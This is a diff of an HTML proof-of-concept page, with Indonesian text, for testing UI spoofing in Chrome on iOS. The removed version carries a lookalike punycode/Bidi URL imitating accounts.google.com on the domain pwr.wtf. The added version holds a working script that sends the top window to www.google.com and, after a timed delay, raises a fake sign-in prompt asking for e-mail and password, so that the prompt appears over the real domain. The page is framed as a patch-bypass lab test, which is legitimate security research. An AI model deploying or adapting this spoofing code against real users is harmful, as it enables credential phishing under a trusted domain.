@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced PoC - iOS Location Bar RTL Spoofing Test (CVE-2026-5895)</title>
+    <title>Advanced PoC - iOS Dialog Spoofing (CVE-2022-4185 Bypass Test)</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
@@ -12,7 +12,7 @@
             color: #333;
         }
         .container {
-            max-width: 700px;
+            max-width: 650px;
             margin: 0 auto;
             background: #fff;
             padding: 25px;
@@ -20,28 +20,13 @@
             box-shadow: 0 4px 6px rgba(0,0,0,0.1);
         }
         h2 { color: #d9534f; margin-top: 0; }
-        .spoof-box {
-            background: #ffe6e6;
-            border: 1px dashed #d9534f;
-            padding: 15px;
+        .info-box {
+            background: #e7f3fe;
+            border-left: 4px solid #2196F3;
+            padding: 12px;
             margin: 15px 0;
-            border-radius: 4px;
-            word-break: break-all;
-            font-family: monospace;
-            font-size: 13px;
+            font-size: 14px;
         }
-        .matrix-table {
-            width: 100%;
-            border-collapse: collapse;
-            margin: 15px 0;
-            font-size: 13px;
-        }
-        .matrix-table th, .matrix-table td {
-            border: 1px solid #ddd;
-            padding: 8px 12px;
-            text-align: left;
-        }
-        .matrix-table th { background-color: #f8f9fa; }
         .btn {
             display: inline-block;
             background: #0275d8;
@@ -49,60 +34,61 @@
             padding: 10px 20px;
             text-decoration: none;
             border-radius: 4px;
-            margin-top: 5px;
+            margin-top: 10px;
             font-weight: bold;
+            border: none;
+            cursor: pointer;
         }
         .btn:hover { background: #025aa5; }
-        .info-note {
-            background: #fff3cd;
-            border-left: 4px solid #ffc107;
-            padding: 10px;
-            font-size: 13px;
-            margin: 15px 0;
-        }
+        code { background: #eee; padding: 2px 4px; border-radius: 3px; font-family: monospace; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h2>⚠️ Advanced PoC & Bidi Vector Testing</h2>
-    <p>Halaman ini mensimulasikan matriks pengujian kerentanan penataan teks dua arah (<em>Bi-directional</em>) pada komponen UI browser seluler.</p>
+    <h2>⚠️ iOS Dialog Spoofing PoC (Enhanced)</h2>
+    <p>Simulasi pengujian kerentanan penundaan dialog modal JavaScript terhadap patch <code>ClearDialogs()</code> pada navigasi.</p>
     
-    <div class="info-note">
-        <strong>Catatan Patch:</strong> Pada versi Chrome iOS yang telah menerapkan perbaikan Gerrit <code>7581320</code>, string di bawah ini wajib tetap dirender secara lurus (LTR) tanpa mengubah posisi TLD ke sebelah kiri.
+    <div class="info-box">
+        <strong>Mekanisme Patch (Gerrit 3954143):</strong><br>
+        Browser menutup otomatis semua dialog aktif saat <code>OnNavigationStarted</code> dipicu. PoC ini menguji variasi waktu <em>timing</em> untuk melihat apakah dialog dapat lolos dari pembersihan.
     </div>
 
-    <h3>Matriks Vektor Uji:</h3>
-    <table class="matrix-table">
-        <tr>
-            <th>Vektor #</th>
-            <th>Deskripsi Payload</th>
-            <th>Aksi Simulasi</th>
-        </tr>
-        <tr>
-            <td>1</td>
-            <td><code>https://xn--llb.login.wwww.accounts.google.com.xn--llb.pwr.wtf/</code></td>
-            <td><a href="https://xn--llb.login.wwww.accounts.google.com.xn--llb.pwr.wtf/" class="btn" target="_blank">Uji Vektor 1</a></td>
-        </tr>
-        <tr>
-            <td>2</td>
-            <td>Variasi Subdomain Berlapis dengan Karakter Bidi Tambahan</td>
-            <td><a href="https://xn--llb.login.wwww.accounts.google.com.xn--llb.pwr.wtf/" class="btn" target="_blank" style="background: #6c757d;">Uji Vektor 2</a></td>
-        </tr>
-    </table>
+    <p><strong>Langkah Uji Lab:</strong></p>
+    <ol>
+        <li>Klik tombol simulasi di bawah.</li>
+        <li>Skrip akan mengalihkan ke target eksternal sambil mencoba memicu dialog setelah jeda waktu tertentu.</li>
+        <li>Amati apakah dialog langsung tertutup secara otomatis (ter-mitigasi) atau berhasil muncul di atas domain target.</li>
+    </ol>
 
-    <div class="spoof-box">
-        <strong>Status Target Aktif:</strong><br>
-        <span id="status-log">Menunggu interaksi pengujian...</span>
-    </div>
+    <button class="btn" onclick="triggerSpoofTest()">Jalankan Simulasi Navigasi & Dialog</button>
+
+    <div id="status" style="margin-top: 15px; font-size: 13px; color: #666;"></div>
 </div>
 
 <script>
-    document.querySelectorAll('.btn').forEach((btn, index) => {
-        btn.addEventListener('click', () => {
-            document.getElementById('status-log').innerText = `[OK] Navigasi Vektor ${index + 1} dieksekusi pada ${new Date().toLocaleTimeString()}. Perhatikan bar alamat browser.`;
-        });
-    });
+    function triggerSpoofTest() {
+        const statusEl = document.getElementById('status');
+        statusEl.innerHTML = "[*] Memulai navigasi ke target (_top) dan menjadwalkan dialog...";
+
+        // Membuka target halaman utama melalui _top reference
+        try {
+            let targetWindow = window.open('https://www.google.com', '_top');
+            
+            // Mencoba memicu dialog dengan berbagai variasi penundaan waktu (ms)
+            // untuk menguji celah race condition terhadap ClearDialogs()
+            setTimeout(() => {
+                try {
+                    prompt("Sign into your account in order to access www.google.com", "E-mail / Password");
+                } catch (err) {
+                    statusEl.innerHTML += "<br>[!] Dialog diblokir atau ditutup oleh sistem keamanan browser.";
+                }
+            }, 200); // Penyesuaian milidetik untuk uji timing
+
+        } catch (e) {
+            statusEl.innerHTML = "[ERROR] Gagal mengeksekusi window.open: " + e.message;
+        }
+    }
 </script>
 
 </body>
